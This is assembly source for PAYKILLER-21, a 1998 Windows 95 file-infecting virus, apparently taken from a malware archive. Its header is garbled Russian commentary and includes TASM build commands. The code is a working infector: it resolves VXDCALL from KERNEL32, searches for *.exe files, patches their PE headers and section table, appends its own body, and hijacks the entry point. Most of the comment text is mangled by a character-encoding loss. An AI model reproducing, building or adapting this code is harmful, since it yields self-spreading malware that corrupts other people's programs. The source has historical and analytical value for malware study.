; ------------------------------------------------------------
; name      P
; type      asm
; cve       —
; year      unknown
; os        DOS
; authors   unknown
; source    krisyotam
; archived  krisyotam (2026)
; notes     —
; ------------------------------------------------------------
;
;                             Mad   Rocker
;                               presents
;              ******************************************
;              *    P A Y K I L L E R - 2 1- " EVIL "   *
;              ******************************************
;
;  "DOS ���p�� ! WINDOWS 95 - ��������������� 32-� p��p����� ���p��������
;�������.����������� WIN 32 API, � ������ �� !" - ��� �p��� ���p�������
;�p��������� �� ���� "����������� p�����������" �� WINDOWS 95.�����������
;����������� ��������� p��p��������� (��� �p�����,�� Microsoft) ������������
;����p�����,��� �������� ������� DOS � BIOS,� ����� ��p������� � ������p��
;��p��� �� WIN 32 �p��p��� �p��������� ����������.��p���,������ protection.
;�� ����� ������� ���� � �� ��p����� �p����."������� ��p� p������� �����-
;�p�� ����p������"-�� ���p�� ����������� �������� ������� ������p������.
;��� ��,���� �� �p��������� �� �p������ p�������-�� ��� ��� ������
;���������� WINDOWS KERNEL.�������p�� ���� ���������������� ��p���� ���
;WINDOWS 95 ,� � ������ ����p����,��� ��� ��� ���������� "�� �������������
;����������� ����� ������ API".�p����,������p�� ��p��� ��� �� ��������
;��p��������� ������� (���p���p,Jacky ��� Mad).�p���� ���  �p�������� ����
;�������� API �� �����p������� ��p���� (���p���� ��p���� WIN95-��p��� Boza),
;��� �������� p���������� ����� "������p�������" ������� ������� � ������
;(�������� p�������� �������� ����p� Harry),� ���������,��-�p������ �p����
;p����������.� �� �� �p��� ���������� ����� �p����� ������ ������� �
;������-��p�� ���p�� ���p�� DOS.������ ���� �p��� ���������� PAYKILLER-21.
;�������,��p������� � DOS ��p�� INT 21h WIN 32 �p�������� �� �����,
;������� ��� ��� �� �p������ ������� ���p������� , �p���� � ������� ������
;� �������� DOS.� ����� �.���p��� "���p��� ���������� �p��p����p������ �
;WINDOWS 95" ������� �����������p������� ������� VXDCALL,� ������� ����p��
;����� �������� DOS ��� DPMI.���� ��� �������� ��p�� ���� �������,��
;��������� ��� ���� �������... � ����p� ������� � ����� ��p��� : ��p�������,
;��p������� Portable Executable-����� � ������� �������� ; �p� ��p������
;�������� ��p����p������ ���������� ������� ; ������������ � ����� ������;
;����p����� � ����p���� �� ����p���.��������p����� TASM 5.0 (�p���� ��
;�p������): tasm32 /ml pkill_21,����� tlink32 /Tpe /aa pkill_21,pkill_21,,
;import32.lib
;
;                                             10  ��p�� 1998 ����
;                                                 Mad  Rocker
;
              .386
              locals
              jumps
              .model flat,stdcall
L  equ     <LARGE>
extrn      MessageBoxA:proc            ;����p��p����� �� import32.lib
extrn      ExitProcess:proc
              .data                    ;������� ������ (����p��� ��� ��p���)
vir_name   db 'PAYKILLER-21',0
vir_text   db 'Animal launching : press OK when ready... ',0
;
main_body:
           pushad                      ;���p���� ��� p�����p� ������ ������.
           push ds                     ;� �� ���� � ��� ���������� p�����p�
           push es
           push fs
           push gs
           call start                  ;��p������� ������� EIP
start:
           pop  ebp
           sub  ebp,offset start       ;��� ���������� ������������ DOS-��p�
           mov  eax,[RVA_sub+ebp]      ;EAX=�p���������� RVA_Entrypoint
           mov  [ret_addr+ebp],eax     ;� ���������� �� ��� �����������
           xor  eax,eax
           mov  esi,0bff70000h+3ch     ;����� ����� ��������� �� PE-���������
           lodsw                       ;���p���� ��� � AX
           add  eax,0bff70000h         ;�p������ ������� ��p��
           xchg esi,eax
           lodsd                       ;������ �������p�
           cmp  eax,00004550h          ;�������p� 'P','E',0,0 ?
           jne  quit                   ;...KERNEL32.DLL �� ������
           mov  eax,[esi+74h]          ;ESI+74h ��������� �� EXPORT TABLE RVA
           add  eax,0bff70000h+1ch
           xchg esi,eax                ;ESI ��������� �� ADDRESS TABLE RVA
           lodsd
           add  eax,0bff70000h
           xchg esi,eax
           lodsd                       ;�������� ��p�� VXDCALL
           add  eax,0bff70000h
           mov  [VxD_addr+ebp],eax
           mov  eax,00002f00h          ;������� ��p�� DTA
           call DOS_kernel
           mov  [DTA_offset+ebp],ebx   ;� ���p���� ��� �� ������ ������
           mov  [DTA_select+ebp],es
           mov  eax,00001a00h          ;��������� ���� DTA
           lea  edx,[my_DTA+ebp]
           call DOS_kernel
           mov  eax,00004e00h          ;����� ������ �� DOS'������ FINDFIRST
           mov  ecx,0000003fh
           lea  edx,[victim+ebp]
           call DOS_kernel
           jnc  open_file              ;���� ���-������ �����,������� ������
find_next:
           mov  eax,00004f00h          ;��� ������ �����
           call DOS_kernel
           jc   unhappy
open_file:
           mov  eax,00003d02h          ;���p����� ���� ��� ������-������
           lea  edx,[my_DTA+1eh+ebp]   ;��p�� ����� �����
           call DOS_kernel
           jc   find_next
           xchg ebx,eax                ;���p����� ����p����p ����� � EBX
           mov  eax,00003f00h          ;������ ��p��� 60h ����
           mov  ecx,00000060h
           lea  edx,[EXE_header+ebp]
           call DOS_kernel
           mov  eax,00004200h          ;��������� ��������� �� PE-���������
           xor  ecx,ecx                ;(���� �� ����,�������)
           xor  edx,edx
           mov  dx, word ptr [EXE_header+3ch+ebp]
           mov  [PE_pointer+ebp],dx
           call DOS_kernel
           mov  eax,00003f00h          ;�p������� 60h ���� PE-���������
           mov  ecx,00000060h
           lea  edx,[EXE_header+ebp]
           call DOS_kernel
           cmp  dword ptr [EXE_header+ebp],00004550h
           jne  file_error             ;��� �� Portable Executable ����...
           cmp  dword ptr [EXE_header+10h+ebp],'LIVE'
           je   file_error             ;���� ��� "���"-���� ��� �p����� !
           mov  ax,word ptr [EXE_header+6+ebp]     ;AX=���������� ��������
           dec  ax
           mov  cx,40
           mul  cx
           add  ax,18h
           add  ax,word ptr [EXE_header+14h+ebp]   ;+NT_Header_size
           add  ax,[PE_pointer+ebp]
           mov  [obj_point+ebp],ax     ;��������� �� ��������� ������
           xor  ecx,ecx
           xor  edx,edx
           mov  dx,ax
           mov  eax,00004200h
           call DOS_kernel
           mov  eax,00003f00h          ;�p������� ��������� ������
           mov  ecx,40
           lea  edx,[WIN_object+ebp]
           call DOS_kernel
           mov  eax,dword ptr [EXE_header+28h+ebp] ;EAX=RVA_Entrypoint
           add  eax,dword ptr [EXE_header+34h+ebp] ;+Image_base
           mov  dword ptr [RVA_sub+ebp],eax        ;���p���� ��� ��������
           xor  edx,edx
           mov  eax,dword ptr [WIN_object+0ch+ebp] ;EAX=RVA �������
           add  eax,dword ptr [WIN_object+8+ebp]   ;+ virtual size �������
           mov  dword ptr [EXE_header+28h+ebp],eax ;����� RVA_Entrypoint
           xor  edx,edx
           mov  eax,vir_size                       ;EAX=p����p ��p��� � ������
           mov  ecx,dword ptr [EXE_header+3ch+ebp] ;ECX=file alignment factor
           div  ecx
           inc  eax
           mul  ecx
           add  eax,dword ptr [WIN_object+8+ebp]   ;+ virtual size �������
           mov  dword ptr [WIN_object+10h+ebp],eax ;����� Object_physical_size
           xor  edx,edx
           mov  eax,vir_size                       ;EAX=p����p ��p��� � ������
           mov  ecx,dword ptr [EXE_header+38h+ebp] ;ECX=object align factor
           div  ecx
           inc  eax
           mul  ecx
           add  eax,dword ptr [WIN_object+8+ebp]   ;+ virtual size �������
           mov  dword ptr [WIN_object+8+ebp],eax   ;����� Object_virtual_size
           mov  dword ptr [WIN_object+24h+ebp],0e0000040h
           mov  eax,dword ptr [WIN_object+8+ebp]
           add  eax,dword ptr [WIN_object+0ch+ebp]
           mov  dword ptr [EXE_header+50h+ebp],eax ;����� Image_size
           mov  dword ptr [EXE_header+10h+ebp],'LIVE'
           mov  eax,00004202h          ;��������� ��������� � ����� �����
           xor  ecx,ecx
           xor  edx,edx
           call DOS_kernel
           mov  eax,00005700h          ;�������� �p��� � ���� �������� �����
           call DOS_kernel
           push ecx
           push edx
           mov  eax,00004000h          ;����� ��� ��p��� � ����
           mov  ecx,vir_size
           lea  edx,[main_body+ebp]
           call DOS_kernel
           mov  eax,00004200h          ;������� ��������� �� ��������� ������
           xor  ecx,ecx
           xor  edx,edx
           mov  dx,word ptr [obj_point+ebp]
           call DOS_kernel
           mov  eax,00004000h          ;������� ��������p������� ������
           mov  ecx,40
           lea  edx,[WIN_object+ebp]
           call DOS_kernel
           mov  eax,00004200h          ;��������� ��������� �� PE-���������
           xor  ecx,ecx
           xor  edx,edx
           mov  dx,word ptr [PE_pointer+ebp]
           call DOS_kernel
           mov  eax,00004000h          ;����� ��������p������� PE-���������
           mov  ecx,60h
           lea  edx,[EXE_header+ebp]
           call DOS_kernel
           pop  edx
           pop  ecx
           mov  eax,00005701h          ;����������� ���� � �p��� ��������
           call DOS_kernel
           mov  eax,00003e00h          ;� ���p����� ����
           call DOS_kernel
unhappy:
           mov  si,ds
           lea  edi,[VxD_out+ebp]
           mov  edx,[DTA_offset+ebp]
           mov  ax, [DTA_select+ebp]
           mov  ds,ax
           mov  eax,00001a00h          ;����������� DTA (���� �����-�� ����)
           call direct
           mov  ds,si
quit:
           cmp  dword ptr [inst+ebp],'LIVE'
           pop  gs
           pop  fs
           pop  es
           pop  ds
           popad
           jne  exit_program
           jmp  go_home               ;���� ��� ��p��� ������
exit_program:
           db   68h                   ;������ � ���� ��p�� ����p���
ret_addr   dd   0
           ret                        ;����p�� ��p������� �p��p����-��������
;
file_error:
           mov  eax,00003e00h
           call DOS_kernel
           jmp  find_next
;
DOS_kernel:                            ;������ INT 21h ��� DOS-�p��p���
           lea  edi,[VxD_out+ebp]
direct:
           push ecx
           push eax
           push 002a0010h              ;������������p VWIN32 � �������� 10h
           push edi
           db   68h                    ;�p����� ������� PUSH
VxD_addr   dd   0                      ;��p�� VXDCALL
           ret                         ;�������� VWIN32 INT_21H_Dispatcher
VxD_out:
           ret                         ;���� VWIN32 ����p���� ��p�������
;
DTA_offset dd   0
DTA_select dw   0
my_DTA     db   43  dup (0)            ;��� Disk Transfer Area
victim     db   '*.exe',0              ;����� ��� ������ ������
EXE_header db   60h dup (0)
WIN_object db   40  dup (0)
PE_pointer dw   0
obj_point  dw   0
RVA_sub    dd   0
vir_size   equ $-main_body             ;����� ��p��� � ������
inst       db   'EVIL'                 ;�p����� ������p���������
              .code                    ;������� ���� (����� ��� �������)
begin:
           push L 0
           push offset vir_name        ;�������� MessageBox'�
           push offset vir_text        ;���������� ���������
           push L 0
           call MessageBoxA            ;������� �p����p�������� MessageBox
           jmp  main_body
go_home:
           push L 0
           call ExitProcess            ;������� �� �p��p���� (�p������)
              end begin
